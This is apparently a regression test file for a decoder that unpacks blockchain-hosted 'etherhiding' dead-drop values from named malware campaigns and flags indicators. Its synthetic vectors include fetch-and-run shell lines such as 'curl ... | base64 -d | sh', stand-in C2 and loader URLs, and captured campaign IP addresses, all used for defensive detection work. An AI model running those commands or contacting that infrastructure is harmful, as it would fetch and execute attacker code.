#!/usr/bin/env python3
"""Regression tests for decode_dd.py.

Two layers:

  1. Offline unit vectors  - synthetic payloads in every encoding style the
     decoder must accept (run by default, no network).
  2. Campaign regression   - real captured dead-drop values from known
     etherhiding campaigns (troyden, deadlock, CLEARFAKE, JADESNOW, ether,
     nochain-sw, amatera, chaindrop). Each vector is the raw eth_call result
     hex at a pinned block, so decoding is fully offline and deterministic:
     known working examples must always keep working. Captured 2026-10-27.
  3. --live (opt-in)        - re-pull every campaign vector at its pinned
     block via public RPC and require the same decode. Pinned blocks, never
     "latest": dead-drops rotate and burn, so only historical state is a
     stable test invariant. Vectors whose RPC refuses historical state
     ("archive requests require a personal token") are SKIPped, not failed.
  4. --live --latest        - re-pull every vector at the chain head instead.
     Dead-drops rotate and burn, so the decode itself is NOT an invariant
     here: this only asserts the RPC answers and the decoder produces a
     sane state, and it reports what each drop currently says.

Run:
  python3 test_decode_dd.py                    # offline layers 1+2
  python3 test_decode_dd.py --live             # live re-pull at pinned blocks
  python3 test_decode_dd.py --live --latest    # live re-pull at chain head
"""
import base64
import gzip
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import decode_dd as dd

HERE = os.path.dirname(os.path.abspath(__file__))
VECTORS = os.path.join(HERE, "campaign_snapshots.json")

ARGS = sys.argv[1:]
LIVE = "--live" in ARGS
LATEST = "--latest" in ARGS
if LATEST and not LIVE:
    print("--latest requires --live", file=sys.stderr)
    sys.exit(2)

# expected decode per campaign vector name: (verdict, method substring, ioc substring;
# method/IOC matching is case-insensitive - chains return checksummed addresses)
CAMPAIGN_EXPECT = {
    "troyden": ("POSITIVE", "abi-string", "http://144.31.108.193"),
    "deadlock": ("POSITIVE", "abi-string", "http://138.226.236.51"),
    "clearfake": ("POSITIVE", "xor16deep(key=24762435", "typeof"),
    "jadesnow-merlionaddr": ("POSITIVE", "abi-string", "8fba1667bef5eda433928b220886a830488549bd"),
    "jadesnow-orchidaddr": ("POSITIVE", "abi-string", "53fd54f55c93f9bcca471cd0ccbabc3acbd3e4aa"),
    "jadesnow-merlion-child": ("POSITIVE", "base64+gzip", "contractInstance"),
    "jadesnow-orchid-child": ("POSITIVE", "abi-string", "/bin/bash"),
    "chaindrop-burned": ("NEGATIVE", "", ""),  # empty return 0x: burned
    "ether-wp-c1": ("POSITIVE", "embedded-xor", "decoyanswer.com"),
    "ether-wp-c2": ("POSITIVE", "embedded-xor", "decoyanswer.com"),
    "ether-wp-c3": ("POSITIVE", "embedded-xor", "decoyanswer.com"),
    "amatera": ("POSITIVE", "abi-string", "thisisafalsepositive.st"),
    "nochain-sw-getdemopage": ("POSITIVE", "abi-string[1]", "<!DOCTYPE html>"),
    "nochain-sw-getscript5": ("POSITIVE", "abi-string[1]", "hasDemoPage"),
}

fails = []
skipped = []


def trunc(s, n=50):
    s = str(s)
    return s if len(s) <= n else s[:n] + "..."


# Public RPCs refuse historical eth_call when they prune or gate archive state.
# That is an endpoint policy, not a decode regression, so those vectors SKIP.
ARCHIVE_ERRS = ("archive requests require a personal token",
                "missing trie node",
                "pruned")


def is_archive_gate(err):
    e = str(err).lower()
    return any(p in e for p in ARCHIVE_ERRS)


def skip(name, reason):
    print("%-42s %s %s" % (name, "SKIP", trunc(reason)))
    skipped.append(name)


def check(name, cond, extra=""):
    print("%-42s %s %s" % (name, "PASS" if cond else "FAIL", trunc(extra)))
    if not cond:
        fails.append(name)


# --- encoder helpers (build vectors in the styles the decoder must accept) ---
def abi_string_hex(s: str) -> str:
    b = s.encode()
    return "0x" + ("%x" % 32).zfill(64) + ("%x" % len(b)).zfill(64) + b.hex()


def b64_hex(s: str) -> str:
    return "0x" + base64.b64encode(s.encode()).hex()


def gzip_b64_hex(s: str) -> str:
    return "0x" + base64.b64encode(gzip.compress(s.encode())).hex()


# ============================================================ layer 1: units

print("=== Offline unit vectors (synthetic payloads, no network) ===")

# --- 1. ABI-encoded plain string (the polygon live-test shape) ---
r = dd.decode_hex(abi_string_hex("thisisafalsepositive.st"))
check("abi-string decodes", any(v["method"] == "abi-string" and v["text"] == "thisisafalsepositive.st"
                               for v in r["variants"]), str(r["variants"])[:100])
check("abi-string verdict POSITIVE (.st is a real TLD -> domain token)", r["verdict"] == "POSITIVE", r["verdict"])

# --- 2. raw base64 string ---
r = dd.decode_hex(b64_hex("aHR0cDovLzQ1LjEuMjMuNDAvbG9hZGVyLnBocA=="))
check("base64 layer found", any("+base64" in v["method"] for v in r["variants"]))
check("base64 verdict POSITIVE (ip url)", r["verdict"] == "POSITIVE", str(r["iocs"]))

# --- 3. gzip+base64 (JADESNOW merlion style) ---
payload = "http://83.97.20.150/payload.bin\ncurl -s http://x.example.com/s.sh | base64 -d"
r = dd.decode_hex(gzip_b64_hex(payload))
check("gzip+base64 layer found", any("gzip" in v["method"] for v in r["variants"]))
check("gzip+base64 verdict POSITIVE", r["verdict"] == "POSITIVE", str(r["iocs"]))

# --- 4. verdict: bare URL / IP / JS / negative ---
r = dd.decode_hex("0x" + b"https://evil.example.tk/c2.txt".hex())
check("url verdict POSITIVE", r["verdict"] == "POSITIVE", str(r["iocs"]))
r = dd.decode_hex("0x" + b"93.184.216.34".hex())
check("ip verdict POSITIVE", r["verdict"] == "POSITIVE", str(r["iocs"]))
r = dd.decode_hex("0x" + b"var x = require('net'); function cb(){}".hex())
check("js snippet verdict POSITIVE", r["verdict"] == "POSITIVE")
r = dd.decode_hex("0x" + bytes(range(0, 60)).hex())
check("random bytes verdict NEGATIVE", r["verdict"] == "NEGATIVE", r["verdict"])

# --- 5. single-byte XOR on base64-decoded content (contract = b64(ct)) ---
key = 0x37
clear = b"http://1.2.3.4/x"
ct = bytes(b ^ key for b in clear)
r = dd.decode_hex("0x" + base64.b64encode(ct).hex())
check("xor1 recovered variant", any("xor1" in v["method"] and "http" in v["text"] for v in r["variants"]),
      str([v["method"] for v in r["variants"]]))
check("xor1 verdict POSITIVE", r["verdict"] == "POSITIVE")

# --- 6. CLEARFAKE-style 16-byte repeating XOR after base64 ---
key16 = bytes.fromhex("24762435247624352476243524762435")
# long, non-repetitive plaintext like a real drop-dead config
words = ("update the loader config now and report back to the operator via the "
         "panel server when the build finishes without errors today ")
msg = (words * 9)[:512].encode()
ct = bytes(b ^ key16[i % 16] for i, b in enumerate(msg))
# the ciphertext then base64-encoded as the contract value
r = dd.decode_hex("0x" + base64.b64encode(ct).hex())
hit = [v for v in r["variants"] if "xor16" in v["method"]]
check("xor16 heuristic fires", bool(hit), str([v["method"] for v in r["variants"]]))
if hit:
    check("xor16 key matches", hit[0]["text"].startswith("update the loader"),
          hit[0]["text"][:40])

# --- 7. recursion: nested base64-in-base64 ---
inner = b64_hex("curl -s http://9.9.9.9/s.sh | base64 -d | sh")
outer = base64.b64encode(bytes.fromhex(inner[2:])).hex()
r = dd.decode_hex("0x" + outer)
check("nested recursion -> base64", any("->base64" in v["method"] for v in r["variants"]),
      str([v["method"] for v in r["variants"]]))
check("nested verdict POSITIVE", r["verdict"] == "POSITIVE")

# --- 8. burned / empty ---
r = dd.decode_hex("0x")
check("0x -> burned state", r["state"] == "burned/rotated", r["state"])
r = dd.decode_hex("")
check("empty -> burned state", r["state"] == "burned/rotated", r["state"])


# ================================================== layer 2: campaign vectors

print("\n=== Campaign regression (real snapshots, pinned blocks) ===")


def campaign_check(r, vec):
    name = vec["name"]
    exp_verdict, exp_method, exp_text = CAMPAIGN_EXPECT[name]
    if name == "chaindrop-burned":
        ok = r["state"] == "burned/rotated" and r["verdict"] == "NEGATIVE"
        check("campaign %s (burned)" % name, ok, r["state"])
        return
    ok = r["verdict"] == exp_verdict and exp_method and any(
        exp_method in v["method"].lower() and exp_text.lower() in v["text"].lower()
        for v in r["variants"])
    got = ", ".join(v["method"] for v in r["variants"][:2]) or "none"
    check("campaign %s" % name, ok, got)


with open(VECTORS) as f:
    vectors = json.load(f)
for vec in vectors:
    r = dd.decode_hex(vec["hex"])
    campaign_check(r, vec)


# ============================================================ layer 3: --live

def live_run():
    n_fail = 0
    for vec in vectors:
        result, err = dd.eth_call(vec["rpc"], vec["to"], vec["data"], vec["block"])
        if err is not None and is_archive_gate(err):
            skip("live %s @ %s" % (vec["name"], vec["block"]), "archive RPC required")
            continue
        if err is not None:
            ok = False
            got = "rpc-error: %s" % err
        else:
            r = dd.decode_hex(result)
            exp_verdict = CAMPAIGN_EXPECT[vec["name"]][0]
            ok = r["verdict"] == exp_verdict
            if ok and vec["name"] != "chaindrop-burned":
                _, exp_method, exp_text = CAMPAIGN_EXPECT[vec["name"]]
                ok = any(exp_method in v["method"].lower() and exp_text.lower() in v["text"].lower()
                         for v in r["variants"])
            got = r["verdict"]
        check("live %s @ %s" % (vec["name"], vec["block"]), ok, "" if ok else got)
        n_fail += 0 if ok else 1
    return n_fail


def live_latest_run():
    """Re-pull every vector at the chain head.

    The decoded value is not an invariant here - dead-drops rotate and burn -
    so the only assertions are that the RPC answers and the decoder returns a
    sane state. What each drop currently says is printed for the operator.
    """
    n_fail = 0
    heads = {}
    for vec in vectors:
        rpc = vec["rpc"]
        if rpc not in heads:
            heads[rpc] = dd.latest_block_number(rpc)[0]
        result, err = dd.eth_call(rpc, vec["to"], vec["data"], "latest")
        name = vec["name"]
        if err is not None and is_archive_gate(err):
            skip("latest %s" % name, "archive RPC required")
            continue
        if err is not None:
            ok, got = False, "rpc-error: %s" % err
        else:
            r = dd.decode_hex(result if isinstance(result, str) else "")
            ok = r["state"] in ("ok", "burned/rotated") and \
                r["verdict"] in ("POSITIVE", "NEGATIVE")
            got = "%s / %s" % (r["state"], r["verdict"])
            iocs = r.get("iocs") or {}
            seen = (iocs.get("urls") or [])[:1] + (iocs.get("ips") or [])[:1]
            if seen:
                got += " " + " ".join(seen)
        head = heads.get(rpc)
        label = "latest %s" % name + (" @ %d" % head if head else "")
        check(label, ok, got)
        n_fail += 0 if ok else 1
    return n_fail


if __name__ == "__main__":
    n_live_fail = 0
    if LIVE:
        if LATEST:
            print("\n=== Live re-pull at chain head "
                  "(informational: dead-drops rotate) ===")
            n_live_fail = live_latest_run()
        else:
            print("\n=== Live re-pull (eth_call at pinned blocks) ===")
            n_live_fail = live_run()
    print("\n%s" % ("ALL PASS" if not fails else "FAILURES: %s" % fails))
    if skipped:
        print("skipped: %d (archive RPC required)" % len(skipped))
    if LIVE:
        print("live: %d fail" % n_live_fail)
    sys.exit(1 if (fails or n_live_fail) else 0)
